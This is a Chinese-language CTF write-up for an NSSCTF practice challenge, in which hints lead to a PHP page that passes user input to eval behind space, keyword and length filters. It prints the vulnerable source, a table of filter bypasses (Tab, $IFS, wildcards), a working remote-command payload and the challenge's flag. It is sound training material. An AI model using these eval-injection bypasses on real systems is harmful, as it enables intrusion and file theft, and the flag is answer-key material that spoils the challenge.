---
title: "[SWPUCTF 2022 新生赛]webdog1__start"
published: 2026-10-30
description: "[SWPUCTF 2022 新生赛]webdog1__start 平台：NSSCTF 2641 · 题目页 robots.txt …"
category: "CTF"
---

# \[SWPUCTF 2022 新生赛\]webdog1\_\_start

平台：NSSCTF 2641 · [题目页](https://www.nssctf.cn/problem/2641)

![](https://pic.npiter.de/file/1793362797852_20261030201954920.png)

### robots.txt

试访问 `robots.txt`，会看到一段提示（若浏览器编码不对可能显示成乱码）。本意大意是：

> 哈哈哈，看来你还是有备而来，我的一切财富都藏在 f14g.php 里面了，去找吧！

于是访问 `f14g.php`。

### 响应头 Hint

页面上看起来信息不多时，打开开发者工具 → Network → 点开该请求 → **Response Headers**，找 `Hint` 字段（和 funny\_web、奇妙的MD5 一样）。

顺着 Hint 会再跳到奇怪文件名，最终落到类似：

`start.php` → `f14g.php` → `F1l1l1l1l1lag.php`

![](https://pic.npiter.de/file/1793362802607_20261030201954921.png)

* * *

## 受限 `eval`

到 `F1l1l1l1l1lag.php` 后，源码大致如下：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if (isset($_GET['get'])) {
    $get = $_GET['get'];
    if (!strstr($get, " ")) {
        $get = str_ireplace("flag", " ", $get);
        if (strlen($get) > 18) {
            die("This is too long.");
        } else {
            eval($get);
        }
    } else {
        die("nonono");
    }
}
?>
```

三道闸：

| 限制 | 含义 | 常见绕过 |
| --- | --- | --- |
| 不能含空格 `" "` | `strstr` 直接 ban | Tab `%09`，或 shell 里 `$IFS` / `${IFS}` |
| 不区分大小写替换 `flag` | `str_ireplace` 会把 flag 换成空格，反而可能触发上一关 | 通配符避开字面量：`/f*`、`/fla?` |
| `strlen($get) ≤ 18` | 按 **URL 解码后** 的字节数算 | 命令尽量短；长参数可另想嵌套（本题短命令就够） |

对照 easyrce：这里仍是 `eval`，只是塞不进带空格的长命令。

### 长度怎么数

`strlen` 数的是解码后的 `$get`。例如：

```text
system("cat%09/f*");  →  system("cat\t/f*");  →  18 字节，刚好踩线通过
system("ls%09/");     →  system("ls\t/");     →  14 字节
```

`cat%09/f*` 用 Tab 代替空格，用 `/f*` 避开文件名里的 `flag` 字样。根目录若主要敏感文件就是 flag，通配也能直接打到。

### 最终 payload

```text
http://<你的节点>/F1l1l1l1l1lag.php?get=system("cat%09/f*");
```

（节点端口以你环境为准，例如 `node5.anna.nssnode.cn:27907`。）

* * *

## Flag

```text
NSSCTF{c5b133e2-f199-4620-bf56-2032e29092f6}
```
